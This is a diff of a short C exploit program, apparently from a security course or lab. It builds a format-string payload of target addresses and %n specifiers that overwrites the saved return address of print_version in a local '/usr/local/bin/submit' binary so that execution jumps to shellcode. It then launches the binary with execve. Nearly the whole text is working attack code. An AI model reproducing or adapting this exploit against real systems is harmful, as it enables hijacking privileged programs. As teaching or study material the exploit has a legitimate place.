@@ -7,25 +7,16 @@
 
 int main(void) {
   char *args[4], *env[1];
-
   int load_size = 140 - strlen("Submission program version 0.1 (") + 4;
 
   args[0] = (char*) malloc(load_size + 1);
+  // eip for print_version is saved at 0xffbfddac
+  // need to write shellcode stored at 0xffbfdfb8 to the eip
+  // 0xb8 ==> 124
+  // 0xdf ==> 039
+  // 0xbf ==> 224
+  // 0xff ==> 064
   strcpy(args[0], "\xac\xdd\xbf\xff.AAA\xad\xdd\xbf\xff.AAA\xae\xdd\xbf\xff.AAA\xaf\xdd\xbf\xff%124x%15$n%039x%17$n%224x%19$n%064x%21$n");
-  // eip saved at 0xffbfddac
-  // sprintf
-  // 0x0804b388
-  // printf
-  // 0x0804b35c
-  // DTOR_END
-  // 0x0804b228
-  // print_version
-  // 0x08048c10
-  // system
-  // 0x4005a790
-
-  // shellcode
-  // 0xffbfdfb8
 
   args[1] = "-v";
   args[2] = shellcode;
@@ -35,4 +26,3 @@ int main(void) {
 
   return execve("/usr/local/bin/submit", args, env);
 }
-
